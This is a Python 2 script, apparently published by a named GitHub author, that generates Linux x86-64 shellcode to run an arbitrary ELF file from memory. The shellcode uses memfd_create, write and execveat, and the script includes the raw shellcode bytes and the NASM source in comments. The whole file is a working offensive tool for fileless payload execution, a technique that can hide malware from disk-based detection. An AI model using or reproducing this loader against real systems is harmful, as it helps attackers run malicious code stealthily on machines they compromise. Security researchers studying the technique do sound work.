#!/usr/bin/env python

# ELF Load Shellcode Generator
# Author: Srakai 
# https://github.com/srakai
#
# This wil generate Linux x86-64 shellcode that will run an elf file from memory
# Shellcode size: 57 + size of elf file
# Sample usage: ./gen.py test-elf-file

from sys import argv
import struct

def usage():
    print "Generate Linux x86-64 shellcode that will run elf file from memory"
    print "Usage: {0} [elf-file]".format(argv[0])
    exit()

def hexify(data):
    ret=''
    for i, c in enumerate(data.encode('hex')):
        if (i%2==0):
            ret+='\\x'
        ret+=c
    return ret 

def int_to_dword(i):
    return struct.pack("<I", i)

def gen_shellcode(elf):

    shellcode =  "\x68\x3f\x01\x00\x00\x58\x48\x31\xf6\x56"
    shellcode += "\x48\x89\xe7\x0f\x05\x50\x5f\x6a\x01\x58"
    shellcode += "\xeb\x1e\x5e\xba\xef\xbe\xad\xde\x0f\x05" 
    shellcode += "\x68\x42\x01\x00\x00\x58\x54\x5e\x54\x5a"
    shellcode += "\x54\x41\x5a\x68\x00\x10\x00\x00\x41\x58"
    shellcode += "\x0f\x05\xe8\xdd\xff\xff\xff"
    
    #	Shellcode assembled with NASM
    #
    #	MEMFD_CREATE     	equ 319
	#	WRITE            	equ 1
	#	EXECVEAT           	equ 322
	#	
	#	section .text
	#	global _start
	#	_start:
	#	
	#	mov     rax, MEMFD_CREATE
	#	mov     rdi, str1_null
	#	mov     rsi, 0
	#	syscall
	#	
	#	mov     rdi, rax
	#	mov     rax, WRITE
	#	mov     rsi, elf_file
	#	mov     rdx, 0xdeadbeef       ; file size
	#	syscall
	#	
	#	mov     rax, EXECVEAT
	#	mov 	rsi, str1_null
	#	mov 	rdx, str1_null
	#	mov 	r10, str1_null
	#	mov 	r8, 0x1000
	#	syscall
	#	
	#	str1_null: dq     0
	#	elf_file:

    
    elf_len = int_to_dword(len(elf))
    shellcode = shellcode.replace('\xef\xbe\xad\xde', elf_len) # set up file size (dword)
    shellcode += elf
    return shellcode

def main():
    if (len(argv)<2):
       usage() 
    try:
        f=open(argv[1], 'rb')
        elf_data=f.read()
        f.close()
    except:
        usage()
    print hexify(gen_shellcode(elf_data))
main()
